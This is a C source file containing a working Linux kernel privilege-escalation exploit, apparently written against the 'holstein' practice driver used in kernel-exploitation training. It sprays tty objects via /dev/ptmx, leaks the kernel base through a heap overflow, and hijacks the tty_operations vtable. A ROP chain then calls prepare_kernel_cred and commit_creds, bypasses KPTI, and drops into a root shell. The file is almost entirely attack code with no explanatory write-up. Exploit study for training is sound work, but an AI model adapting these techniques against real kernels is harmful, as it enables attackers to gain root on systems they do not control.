#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define SPRAY_OBJECT "/dev/ptmx"
#define BUFFER_SIZE 0x400
#define SPRAY_WIDTH 100

#define mov_rdi_rax_rep (kbase + 0x62707b);
#define pop_rdi (kbase + 0x0d748d);
#define pop_rcx_12_rbp (kbase + 0x2e4329);
#define prepare_kernel_cred (kbase + 0x074650);
#define commit_creds (kbase + 0x0744b0);
#define kpti_trampoline (kbase + 0x800e10 + 22); // swapgs_restore_regs_and_return_to_usermode
#define push_r8_stuff_pop_rsp_stuff_ret (kbase + 0x5f7e60); // push r8 ; add dword ptr [rbx + 0x41], ebx ; pop rsp ; pop r13 ; pop rbp ; ret
unsigned long kbase;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

int fd;
int spray[SPRAY_WIDTH];
char payload[BUFFER_SIZE+0x200];
unsigned long slot_buf;

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void save_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov _proc_cs, cs;"
        "mov _proc_ss, ss;"
        "mov _proc_rsp, rsp;"
        "pushf;"
        "pop _proc_rflags;"
        ".att_syntax"
        );

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void spawn_shell()
{
    puts("[+] Hello Userland!");

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();

    for(int i = 0; i < SPRAY_WIDTH/2; i++) {
        spray[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if (spray[i] < 0) {
            error("[-] open spray");
        }
    }
    
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        error("[-] open device");
    }
    printf("[+] device opened at: %d\n", fd);

    for(int i = 50; i < SPRAY_WIDTH; i++) {
        spray[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if (spray[i] < 0) {
            error("[-] open spray");
        }
    }

    if (read(fd, payload, 0x450) < 0) {
        error("[-] read");
    }

    slot_buf = *(unsigned long *)&payload[0x438] - 0x438;
    kbase = *(unsigned long *)&payload[0x418] - 0xc38880;
    printf("[+] g_buf := %#lx\n", slot_buf);
    printf("[+] kernel base := %#lx\n", kbase);

    // fuzzing for vtable function offset
    // puts("[*] setting up fake vtable");
    // unsigned long *ptr = (unsigned long *)&payload;
    // for(int i = 0x0; i < BUFFER_SIZE/0x8; i++) {
    //     *ptr++ = 0xdeadc0dedead0000 + (i << 8);
    //     printf("[*] payload[%d]: %#lx\n", i, *(unsigned long *)&payload[i]);
    // }

    // setup ROP
    unsigned long *chain = (unsigned long *)&payload[12*8];
    *chain++ = push_r8_stuff_pop_rsp_stuff_ret;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = pop_rdi;
    *chain++ = 0x0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rcx_12_rbp;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax_rep;
    *chain++ = commit_creds;
    *chain++ = kpti_trampoline;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = (unsigned long) &spawn_shell;
    *chain++ = _proc_cs;
    *chain++ = _proc_rflags;
    *chain++ = _proc_rsp;
    *chain++ = _proc_ss;

    // overwrite tty_operations vtable
    // struct tty_struct {
    // 	int	magic;
    // 	struct kref kref; // 4 bytes
    // 	struct device *dev;	
    // 	struct tty_driver *driver;
    // 	const struct tty_operations *ops; // target
    // ...
    // }
    puts("[*] overwriting tty_operations vtable");
    *(unsigned long *)&payload[0x418] = slot_buf;

    puts("[*] sending payload");
    if (write(fd, &payload, 0x450) < 0) {
        error("[-] write");
    }

    puts("[*] triggering payload");
    for(int i = 0; i < SPRAY_WIDTH; i++){
        ioctl(spray[i], 0xdeadc0de /* esi ecx r12d */, (unsigned long)slot_buf+0x68 /* rdx r8 r14 */);
    }

    puts("\n[*] idle...");
    getchar();   
}